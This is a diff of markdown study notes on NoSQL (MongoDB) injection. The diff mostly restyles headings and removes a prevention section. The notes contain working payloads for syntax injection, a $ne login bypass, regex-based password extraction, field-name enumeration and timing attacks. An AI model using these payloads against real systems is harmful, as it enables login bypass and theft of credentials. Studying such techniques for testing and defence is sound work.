@@ -19,12 +19,12 @@
 
 </details>
 
-### Types of NoSQL injection <a href="#types-of-nosql-injection" id="types-of-nosql-injection"></a>
+### <mark style="color:yellow;">Types of NoSQL injection</mark> <a href="#types-of-nosql-injection" id="types-of-nosql-injection"></a>
 
 1. Syntax injection - when you can break the NoSQL query syntax, enabling the injection (likeSQLi).
 2. Operator injection - when you can use NoSQL query operators to manipulate queries.
 
-## NoSQL syntax injection <a href="#nosql-syntax-injection" id="nosql-syntax-injection"></a>
+## <mark style="color:yellow;">NoSQL syntax injection</mark> <a href="#nosql-syntax-injection" id="nosql-syntax-injection"></a>
 
 * Consider: `https://insecure-website.com/product/lookup?category=fizzy`
 * This causes the application to send a JSON query to retrieve relevant products from the `product` collection in the MongoDB database:
@@ -34,7 +34,7 @@
 * Confirm this by submitting a valid query string in the input, ex: `\'` -> `this.category == '\''`
   * If this doesn't cause a syntax error, this may mean that the application is vulnerable to an injection attack.
 
-### **Confirming conditional behavior**
+### <mark style="color:yellow;">**Confirming conditional behavior**</mark>
 
 ```markdown
 # False condition
@@ -51,9 +51,9 @@ https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
 https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
 ```
 
-* If the application behaves differently suggests that the false condition impacts the query logic, but the true condition doesn't.
+If the application behaves differently suggests that the false condition impacts the query logic, but the true condition doesn't.
 
-### **Overriding existing conditions**
+### <mark style="color:yellow;">**Overriding existing conditions**</mark>
 
 ```markdown
 # Always true: 
@@ -68,11 +68,14 @@ this.category == 'fizzy'||1||''
 ```
 
 * The modified query returns all items (all the products in any category).
-* WARN: If an application uses it when updating or deleting data, for example, this can result in accidental data loss.
+
+{% hint style="warning" %}
+**Warn**: If an application uses it when updating or deleting data, for example, this can result in accidental data loss.
+{% endhint %}
 
 **Null character**
 
-* MongoDB may ignore all characters after a null character. This means that any additional conditions on the MongoDB query are ignored.
+MongoDB may ignore all characters after a null character. This means that any additional conditions on the MongoDB query are ignored.
 
 ```markdown
 # Back-end code
@@ -85,7 +88,7 @@ https://insecure-website.com/product/lookup?category=fizzy'%00
 this.category == 'fizzy'\u0000' && this.released == 1
 ```
 
-## NoSQL operator injection
+## <mark style="color:yellow;">NoSQL operator injection</mark>
 
 <details>
 
@@ -116,7 +119,7 @@ MongoDB Query and Projection Operators: [https://www.mongodb.com/docs/manual/ref
 * URL parameters:
   * `username=wiener` -> `username[$ne]=invalid`
 
-
+***
 
 * If this doesn't work, you can try the following (or use Content Type Converter burp exts):
   1. Convert the request method from `GET` to `POST`.
@@ -124,7 +127,7 @@ MongoDB Query and Projection Operators: [https://www.mongodb.com/docs/manual/ref
   3. Add JSON to the message body.
   4. Inject query operators in the JSON.
 
-### **Testing**
+### <mark style="color:yellow;">**Testing**</mark>
 
 ```markdown
 # Login bypass
@@ -143,7 +146,7 @@ MongoDB Query and Projection Operators: [https://www.mongodb.com/docs/manual/ref
 * `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`
 * This query returns all login credentials where both the username and password are not equal to `invalid`. As a result, you're logged into the application as the first user in the collection.
 
-## Extract data
+## <mark style="color:yellow;">Extract data</mark>
 
 **INSIDE $WHERE**
 
@@ -172,7 +175,7 @@ MongoDB Query and Projection Operators: [https://www.mongodb.com/docs/manual/ref
 * `{"username":"admin","password":{"$regex":"^a*"}}`
   * Extract data character by character
 
-## Identify field names
+## <mark style="color:yellow;">Identify field names</mark>
 
 **FIRST WAY**
 
@@ -233,7 +236,7 @@ db.collection.find({ "$where": "Object.keys(this)[0].match('^.{0}a.*')" })
 
 </details>
 
-## Timing based injection
+## <mark style="color:yellow;">Timing based injection</mark>
 
 Database error doesn't cause a difference in the application's response? Trigger a conditional time delay
 
@@ -244,42 +247,3 @@ Database error doesn't cause a difference in the application's response? Trigger
 * Trigger a time delay if the password beings with the letter `a`
   * `admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'`
   * `admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'`
-
-## Prevention
-
-* Sanitize and validate user input, using an allowlist of accepted characters.
-* Insert user input using parameterized queries instead of concatenating user input
-*   To prevent operator injection, apply an allowlist of accepted keys.
-
-    \
-
-
-\
-
-
-\
-
-
-\
-\
-
-
-\
-
-
-\
-
-
-\
-
-
-\
-
-
-\
-
-
-\
-
-
-\
